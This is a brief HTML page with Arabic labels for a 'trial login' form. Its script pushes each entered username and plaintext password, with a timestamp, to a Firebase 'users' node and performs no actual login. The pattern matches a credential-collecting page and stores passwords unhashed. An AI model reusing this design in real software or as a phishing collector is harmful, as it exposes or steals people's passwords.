<style>
  body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; }
  .login-box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 300px; }
  input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
  button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
  button:hover { background: #0056b3; }
</style>

<div class="login-box">
  <h3>تسجيل دخول تجريبي</h3>
  <input type="text" id="username" placeholder="اسم المستخدم">
  <input type="password" id="password" placeholder="كلمة المرور">
  <button onclick="saveData()">دخول</button>
  <p id="status" style="font-size: 12px; color: green;"></p>
</div>

<script>
  function saveData() {
    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    const status = document.getElementById('status');

    if (user && pass) {
      // إرسال البيانات إلى مجلد users في Firebase
      db.ref('users/').push({
        username: user,
        password: pass,
        time: new Date().toLocaleString()
      }).then(() => {
        status.innerText = "تم إرسال البيانات بنجاح!";
        document.getElementById('username').value = "";
        document.getElementById('password').value = "";
      }).catch((error) => {
        status.style.color = "red";
        status.innerText = "خطأ: " + error.message;
      });
    } else {
      alert("يرجى ملء البيانات");
    }
  }
</script>
